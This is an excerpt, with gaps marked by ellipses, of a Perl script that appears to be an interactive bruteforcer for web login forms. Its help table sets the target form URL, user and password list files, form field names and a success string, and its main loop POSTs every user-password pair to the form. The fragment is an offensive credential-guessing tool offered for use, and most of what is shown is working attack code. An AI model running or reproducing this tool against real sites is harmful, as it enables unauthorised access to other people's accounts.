...
if ($^O =~ /MSWin32/) {system('mode con cols=200 lines=50');system("cls"); }else { print "\e[8;30;110t";system("clear"); } #Resize & clear window
...
print color('bold white'),"Type `help` for help screen and `start` to start bruteforcing.\n";
...
$opt_count = @options;
	...
	{
		if($formUrl eq '' or $_usrsList eq '' or $_pwsList eq '' or $_userField eq '' or $_passField eq '' or $successMsg eq '')
		{
			print color('bold bright_red'),"[ERROR]";
...
$t->add_row([ "set url <value>", "Setting the form url to a new value", "set url http://www.example.com/form1.php" ]);
$t->add_row([ "set users <value>", "Give users list a new value", "set users users_list.txt" ]);
$t->add_row([ "set passwords <value>", "Give passwords list a new value", "set passwords passwords_list.txt" ]);
$t->add_row([ "set userField <value>", "Enter the value of the user field (as in the html source)", "set userField username" ]);
$t->add_row([ "set passField <value>", "Enter the value of the password field (as in the html source)", "set userField password" ]);
$t->add_row([ "set ssMsg <value>", "Setting the success string to test on", "set ssMsg success.txt" ]);
...
$user = trim($user);
		last if($stop == 1);
		 ...
		 foreach $pass (@passwords)
		 {
			...
			my $response = $ua->post($formUrl, [ "$_userField" => "$user", "$_passField" => "$pass" ]); 
